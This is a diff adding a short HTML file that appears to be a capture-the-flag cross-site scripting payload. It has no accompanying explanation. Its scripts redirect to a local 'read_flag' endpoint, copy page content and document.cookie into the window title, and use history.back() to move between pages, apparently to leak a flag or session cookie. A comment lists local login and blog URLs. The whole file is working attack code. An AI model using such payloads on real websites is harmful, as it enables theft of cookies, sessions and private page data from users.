@@ -1,0 +1,18 @@
+<script>
+  window.location.replace("http://127.0.0.1:30000/read_flag");
+  document.childNodes.forEach((e) => (document.title += e.innerHTML));
+</script>
+<script>
+  document.title = document.cookie;
+</script>
+<script>
+  history.back();
+  document.childNodes.forEach((e) => (document.title += e.innerHTML));
+</script>
+<script>
+  document.title = document.cookie;
+</script>
+<!--
+http://127.0.0.1:30000/login
+http://127.0.0.1:31000/blog
+-->
